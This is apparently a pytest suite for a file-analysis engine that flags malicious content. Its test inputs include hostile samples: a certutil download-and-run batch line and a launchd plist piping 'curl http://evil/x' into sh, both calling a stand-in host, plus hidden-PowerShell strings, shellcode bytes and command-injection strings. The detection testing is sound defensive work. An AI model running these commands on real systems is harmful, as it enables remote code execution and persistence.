"""Smoke / behaviour tests for the FileDessect engine.

These run without the optional native dependencies (libmagic, yara, pefile,
oletools); analyzers degrade gracefully, and the engine still produces a
coherent verdict from the pure-Python analyzers (identity, content, embedded).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.engine import Engine  # noqa: E402


def analyze(data: bytes, filename: str = "sample.bin") -> dict:
    return Engine().analyze(path="/tmp/x", filename=filename, data=data)


def test_clean_text_file_is_clean():
    report = analyze(b"Hello, this is a perfectly ordinary text file.\n" * 5, "notes.txt")
    assert report["verdict"] == "clean"
    assert report["identity"]["hashes"]["sha256"]
    assert report["risk_score"] < 30


def test_embedded_pe_inside_image_is_flagged():
    # PNG header + IEND + an embedded MZ/PE header appended after it.
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64 + b"IEND\xaeB`\x82"
    payload = png + b"MZ\x90\x00\x03\x00\x00\x00" + b"This program cannot be run" + b"\x00" * 200
    report = analyze(payload, "picture.png")
    finding_ids = {f["id"] for f in report["findings"]}
    assert "embedded.foreign_signature" in finding_ids
    assert report["verdict"] in {"suspicious", "malicious"}


def test_double_extension_is_high_severity():
    report = analyze(b"MZ" + b"\x00" * 100, "invoice.pdf.exe")
    finding_ids = {f["id"] for f in report["findings"]}
    assert "identity.double_extension" in finding_ids


def test_suspicious_powershell_strings_escalate():
    data = (
        b"powershell -nop -w hidden -EncodedCommand SQBFAFgA "
        b"DownloadString Invoke-Expression VirtualAlloc CreateRemoteThread"
    )
    report = analyze(data, "loader.txt")
    assert report["verdict"] in {"suspicious", "malicious"}
    assert any(f["id"] == "content.suspicious_api" for f in report["findings"])


def test_report_structure():
    report = analyze(b"abc", "a.txt")
    for key in ("verdict", "risk_score", "explanation", "summary", "findings",
                "identity", "analyzers", "scoring", "virustotal_enabled"):
        assert key in report


def test_virustotal_enabled_by_default():
    report = Engine().analyze(path="/tmp/x", filename="a.txt", data=b"hello world")
    assert report["virustotal_enabled"] is True
    assert any(a["analyzer"] == "virustotal" for a in report["analyzers"])


def test_virustotal_can_be_disabled():
    report = Engine().analyze(
        path="/tmp/x", filename="a.txt", data=b"hello world", enable_virustotal=False
    )
    assert report["virustotal_enabled"] is False
    assert not any(a["analyzer"] == "virustotal" for a in report["analyzers"])


def test_scoring_breakdown_matches_findings():
    # PE-looking content with several keyword hits to generate findings.
    data = b"MZ" + b"\x00" * 64 + b"powershell -enc DownloadString Invoke-Expression"
    report = analyze(data, "x.bin")
    sc = report["scoring"]
    # Breakdown has one row per finding and the weights sum to the risk score.
    assert len(sc["breakdown"]) == len(report["findings"])
    assert sum(b["weight"] for b in sc["breakdown"]) == report["risk_score"]
    assert sc["reason"]
    assert sc["thresholds"] == {"suspicious": 30, "malicious": 90}


def test_scoring_model_is_self_consistent():
    from backend.engine import scoring_model

    model = scoring_model()
    weights = {s["severity"]: s["weight"] for s in model["severity_weights"]}
    assert weights == {"info": 0, "low": 10, "medium": 30, "high": 60, "critical": 100}
    assert len(model["verdict_thresholds"]) == 3
    assert model["hard_overrides"]


def test_python_script_constructs_detected():
    code = (
        b"import os, base64\n"
        b"exec(base64.b64decode('cHJpbnQ='))\n"
        b"os.system('rm -rf /tmp/x')\n"
    )
    report = analyze(code, "loader.py")
    c = next(a for a in report["analyzers"] if a["analyzer"] == "code")
    assert c["metadata"]["language"] == "python"
    ids = {f["id"] for f in report["findings"]}
    assert "code.suspicious_constructs" in ids
    patterns = {i["pattern"] for i in c["metadata"]["indicators"]}
    assert "exec()" in patterns and "os.system()" in patterns


def test_batch_download_execute():
    bat = b"@echo off\r\ncertutil -urlcache -f http://evil/x.exe x.exe\r\nstart x.exe\r\n"
    report = analyze(bat, "run.bat")
    c = next(a for a in report["analyzers"] if a["analyzer"] == "code")
    assert c["metadata"]["language"] == "batch"
    assert any(i["pattern"] == "certutil" for i in c["metadata"]["indicators"])


def test_launchd_plist_persistence():
    plist = (
        b'<?xml version="1.0"?>\n<!DOCTYPE plist>\n<plist><dict>'
        b"<key>RunAtLoad</key><true/>"
        b"<key>ProgramArguments</key><array><string>/bin/sh</string>"
        b"<string>-c</string><string>curl http://evil/x | sh</string></array>"
        b"</dict></plist>"
    )
    report = analyze(plist, "com.evil.agent.plist")
    ids = {f["id"] for f in report["findings"]}
    assert "code.launchd_persistence" in ids


def test_macho_parsing_and_unsigned():
    import struct

    name = b"/usr/lib/libSystem.B.dylib\x00"
    name += b"\x00" * ((-len(name)) % 8)
    dylib_cmd = struct.pack("<IIIIII", 0x0C, 24 + len(name), 24, 0, 0, 0) + name
    header = struct.pack(
        "<IIIIIII", 0xFEEDFACF, 0x01000007, 3, 2, 1, len(dylib_cmd), 0
    ) + b"\x00\x00\x00\x00"  # reserved (64-bit header)
    data = header + dylib_cmd

    report = analyze(data, "binary")
    m = next(a for a in report["analyzers"] if a["analyzer"] == "macho")
    assert m["metadata"]["is_macho"] is True
    assert m["metadata"]["arch"] == "x86_64"
    assert any("libSystem" in d for d in m["metadata"]["dylibs"])
    assert m["metadata"]["code_signature"] is False
    assert any(f["id"] == "macho.unsigned" for f in report["findings"])


def test_readable_strings_filter_noise():
    from backend.analyzers.utils import is_human_readable

    assert is_human_readable("Could not open configuration file")
    assert is_human_readable("/usr/local/bin/python3")
    assert not is_human_readable("x8Fk2Lq")
    assert not is_human_readable("aaaaaa")


def test_disassembly_of_real_elf():
    import shutil as _sh

    if not _sh.os.path.exists("/bin/ls"):
        return
    data = open("/bin/ls", "rb").read()
    report = analyze(data, "ls")
    d = next((a for a in report["analyzers"] if a["analyzer"] == "disasm"), None)
    assert d is not None
    # Capstone may be unavailable in a bare env; only assert when it ran.
    if d.get("error"):
        return
    meta = d["metadata"]
    assert meta["architecture"] in ("x86", "x86_64", "arm", "arm64")
    assert meta["disassembly"], "expected a disassembly listing"
    first = meta["disassembly"][0]
    assert {"addr", "bytes", "mnemonic", "op_str"} <= set(first)


def test_disassembly_flags_peb_shellcode():
    try:
        import capstone  # noqa: F401
    except Exception:
        return
    # x64 shellcode prologue: mov rax, gs:[0x60] (PEB access) + nop sled.
    shellcode = b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00" + b"\x90" * 20 + b"\x0f\x05\xc3"
    # Wrap in a minimal ELF so the analyzer's loader picks it up? Instead test the
    # byte-signature scan path directly via the classifier + signatures.
    from backend.analyzers.disasm import _BYTE_SIGS

    assert _BYTE_SIGS["peb_x64"][0].search(shellcode)
    assert _BYTE_SIGS["nop_sled"][0].search(shellcode)


def test_detect_runtime():
    from backend.analyzers.utils import detect_runtime

    assert detect_runtime(b"....Go buildinf: blah runtime.morestack....") == "go"
    assert detect_runtime(b"panic at /rustc/abc/library/std/src/...") == "rust"
    assert detect_runtime(b"just some plain text") is None


def test_tld_allowlist_filters_symbol_noise():
    from backend.analyzers.utils import is_valid_domain

    assert is_valid_domain("evil-c2.com")
    assert is_valid_domain("example.co.uk")
    assert is_valid_domain("payload.xyz")
    # Go/Rust symbol soup that the old regex wrongly treated as domains:
    assert not is_valid_domain("reflect.Value.CanInterface")
    assert not is_valid_domain("uuid.FromString")
    assert not is_valid_domain("0d.nx")


def test_base64_heuristic_rejects_word_tables():
    import base64 as _b64
    from backend.analyzers.utils import looks_like_base64

    real = _b64.b64encode(bytes(range(256)) * 2).decode()
    assert looks_like_base64(real)
    # A Go runtime string-table fragment (dictionary words, no +//=):
    assert not looks_like_base64("ddebugdefererrorfaintfalsefaultfuzzygFreegcinggreengscanhchanhtt")


def test_go_binary_suppresses_false_positives():
    # Synthesised Go-ish content: runtime markers + benign runtime APIs + a
    # symbol that looks domain-shaped + a word-table base64 lookalike.
    data = (
        b"Go buildinf: x runtime.morestack runtime.gopanic\n"
        b"VirtualAlloc VirtualProtect\n"
        b"reflect.Value.CanInterface uuid.FromString\n"
        b"ddebugdefererrorfaintfalsefaultfuzzygFreegcinggreengscanhchanhttp\n"
    )
    report = analyze(data, "pcqf.bin")
    assert report["identity"]["runtime"] == "go"
    content = next(a for a in report["analyzers"] if a["analyzer"] == "content")["metadata"]
    # VirtualAlloc/VirtualProtect must not be counted as suspicious in Go.
    api = next((f for f in report["findings"] if f["id"] == "content.suspicious_api"), None)
    if api:
        kws = {i["keyword"] for i in api["data"]["indicators"]}
        assert "VirtualAlloc" not in kws and "VirtualProtect" not in kws
    # Symbol-shaped "domains" filtered out; word-table not counted as base64.
    assert content["domain_count"] == 0
    assert content["base64_blob_count"] == 0


def test_unvalidated_zip_signature_downgraded():
    # PK\x03\x04 with no End-of-Central-Directory => coincidental, INFO only.
    data = b"MZ" + b"\x00" * 200 + b"PK\x03\x04" + b"\x00" * 200
    report = analyze(data, "x.bin")
    fs = next((f for f in report["findings"] if f["id"] == "embedded.foreign_signature"
               and f["data"].get("embedded_type") == "ZIP archive"), None)
    assert fs is not None
    assert fs["data"]["validated"] is False
    assert fs["severity"] == "info"


def test_rizin_marker_split_roundtrip():
    from backend import rizin

    out = (
        "analysis noise line\n"
        f"{rizin._MARKER_PREFIX}functions{rizin._MARKER_SUFFIX}\n"
        '[{"name":"main","offset":4096}]\n'
        f"{rizin._MARKER_PREFIX}info{rizin._MARKER_SUFFIX}\n"
        '{"bin":{"arch":"x86"}}\n'
    )
    chunks = rizin._split_markers(out)
    assert chunks["functions"] == '[{"name":"main","offset":4096}]'
    assert rizin._loadj(chunks["info"]) == {"bin": {"arch": "x86"}}


def test_rizin_safe_seek_blocks_command_injection():
    from backend import rizin

    # Legitimate targets pass through unchanged.
    assert rizin._safe_seek("main") == "main"
    assert rizin._safe_seek("0x401000") == "0x401000"
    assert rizin._safe_seek("sym.imp.CreateRemoteThread") == "sym.imp.CreateRemoteThread"
    # Anything that could chain another rizin command is rejected.
    for evil in ("main; px", "0x10`id`", "main|grep", "a@b", "", "  "):
        assert rizin._safe_seek(evil) is None


def test_rizin_session_script_targets_dangerous_imports():
    from backend import rizin

    script = rizin.build_session_script("evil.exe", ["CreateRemoteThread", "WriteProcessMemory"])
    assert "aaa" in script
    assert "s entry0" in script
    assert "axt @ sym.imp.CreateRemoteThread" in script
    assert "evil.exe" in script
    # Newlines in a filename must not break out of the comment line.
    assert "\n" not in rizin.build_session_script("a\nb.exe", []).splitlines()[0]


def test_rizin_resolve_function_nearest_preceding():
    from backend import rizin

    # Functions starting at 0x1000, 0x2000, 0x3000 (names, one unnamed).
    funcs = [
        {"offset": 0x1000, "name": "main"},
        {"offset": 0x3000, "name": "helper"},
        {"offset": 0x2000, "name": None},  # unnamed; index must stay bisect-safe
    ]
    idx = rizin._function_index(funcs)
    # An address inside main resolves to main, not to a later/overlapping function.
    assert rizin._resolve_function(idx, 0x1500) == ("main", 0x1000)
    assert rizin._resolve_function(idx, 0x2000) == (None, 0x2000)
    assert rizin._resolve_function(idx, 0x3abc) == ("helper", 0x3000)
    # Below the first function start -> unresolved.
    assert rizin._resolve_function(idx, 0x500) == (None, None)


def test_rizin_decode_base64_comment():
    import base64

    from backend import rizin

    encoded = base64.b64encode(b"resolve API by hash").decode()
    assert rizin._decode_comment(encoded) == "resolve API by hash"
    assert rizin._decode_comment("plain comment") == "plain comment"
    assert rizin._decode_comment(None) is None


def test_cutter_analyzer_skips_without_rizin(monkeypatch):
    from backend import rizin
    from backend.analyzers.base import FileContext
    from backend.analyzers.cutter import CutterAnalyzer

    monkeypatch.setattr(rizin, "available", lambda: False)
    ctx = FileContext(path="/tmp/x", filename="x.exe", size=4, data=b"MZ\x00\x00")
    assert CutterAnalyzer().applies(ctx) is False


def test_session_store_lifecycle(tmp_path):
    from backend.sessions import SessionStore

    store = SessionStore(tmp_path, ttl_seconds=1000)
    sid = store.create(b"MZ\x00\x00binary", "x.exe")
    assert store.path(sid) is not None
    assert store.get(sid).filename == "x.exe"
    assert store.delete(sid) is True
    assert store.path(sid) is None
    assert store.delete(sid) is False


def test_session_store_expiry(tmp_path):
    from pathlib import Path

    from backend.sessions import SessionStore

    store = SessionStore(tmp_path, ttl_seconds=0)  # everything is already expired
    sid = store.create(b"data", "x.bin")
    # purge runs on access; the expired session and its file are gone.
    assert store.path(sid) is None
    assert not list(Path(tmp_path).glob("*.bin"))


def test_full_iocs_included():
    data = b"visit http://evil.example.com/payload and http://c2.test/beacon now"
    report = analyze(data, "ioc.txt")
    content = next(a for a in report["analyzers"] if a["analyzer"] == "content")
    urls = content["metadata"]["urls"]
    assert any("evil.example.com" in u for u in urls)
    assert content["metadata"]["url_count"] == len(urls)
